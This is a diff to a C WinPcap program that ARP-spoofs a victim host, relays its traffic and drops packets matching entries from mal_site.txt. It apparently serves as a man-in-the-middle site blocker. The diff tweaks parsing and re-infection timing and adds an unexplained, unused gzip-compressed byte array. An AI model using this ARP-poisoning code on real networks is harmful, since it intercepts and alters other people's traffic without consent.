@@ -7,8 +7,6 @@
 #include <IPHlpApi.h>
 #pragma comment(lib, "iphlpapi.lib")
 
-#pragma HAVE_REMOTE
-#pragma WPCAP
 #ifndef WIN32
 #include <sys/socket.h>
 #include <netinet/in.h>
@@ -283,6 +281,8 @@ int main(int argc, char* argv[]) {
 	u_char myMAC[6];
 	u_char gatewayMAC[6]; // setting at line 379
 
+	u_char gzip[128] = { 31, -117, 8, 0, 0, 0, 0, 0, 0, 0, -29, 22, 98, -27, 96, 80, 120, -63, -34, -59, -104, -58, -63, 44, -108, 96, 92, 99, 100, 104, 102, 104, 105, 102, 97, 110, 82, -109, -100, -97, -85, -105, -107, -105, -103, -110, -102, -101, -81, -105, 88, 80, 80, -100, -97, 83, 90, -110, -103, -97, 7, 19, -85, 49, -84, 113, -12, -53, -15, -9, 8, -12, 79, 75, 115, 77, 116, -11, 44, 72, 118, 76, -12, -15, 12, 44, -9, 118, -85, 40, -48, 118, 13, -56, -86, 74, -52, 115, 45, -73, -75, -83, 49, 52, 49, 53, 54, 50, 52, 50, 51, 52, 53, 53, 48, -111, 98, -32, 1, 0, -106, 39, -125, -109, 114, 0, 0, 0 };
+
 	my_MAC(myMAC);
 	for (i = 0; i < 6; i++) {
 		fakeMAC[i] = 'a';
@@ -291,9 +291,21 @@ int main(int argc, char* argv[]) {
 	// reading mal_site.txt
 	fopen_s(&fp, "mal_site.txt", "r");
 	while (fgets(block[len], 100, fp)) {
-		block[len][strlen(block[len]) - 1] = 0x00;
+		for (i = 7;; i++) {
+			if (block[len][i] == 0x0a) {
+				if (block[len][i - 1] == '/') {
+					block[len][i - 8] = 0x00;
+				}
+				else {
+					block[len][i - 7] = 0x00;
+				}
+				break;
+			}
+			block[len][i - 7] = block[len][i];
+		}
 		len++;
 	}
+	len--;
 	fclose(fp);
 
 	/* Retrieve the device list on the local machine */
@@ -416,7 +428,7 @@ int main(int argc, char* argv[]) {
 		if (res == 0)
 			/* Timeout elapsed */
 			continue;
-		if (count_reinfect > 5) {
+		if (count_reinfect > 30) {
 			count_reinfect = 0;
 			if (pcap_sendpacket(adhandle, arp_data, 42) != 0) {
 				printf("Error : Sending arp spoofing packet to victim !\n");
@@ -496,20 +508,18 @@ int main(int argc, char* argv[]) {
 				for (i = 12; i < (header->caplen); i++) {
 					relaying_data[i] = pkt_data[i];
 				}
-				
+
 				// checking this packet contains mal_site
 				for (i = 0; i < len; i++) {
-					
-					if (strstr(relaying_data, block[i])) {
+					if (strstr(&relaying_data[54], block[i])) {
 						local_tv_sec = header->ts.tv_sec;
 						localtime_s(&ltime, &local_tv_sec);
 						strftime(timestr, sizeof timestr, "%H:%M:%S", &ltime);
 
-						printf("%s | approach to \"%s\" blocked!\n", timestr,block[i]);
+						printf("%s | approach to \"http://%s\" blocked!\n", timestr,block[i]);
 						break;
 					}
 				}
-
 				// if there is no mal_site, send packet to relay
 				if (i == len) {
 					if (pcap_sendpacket(adhandle, relaying_data, header->caplen) != 0) {
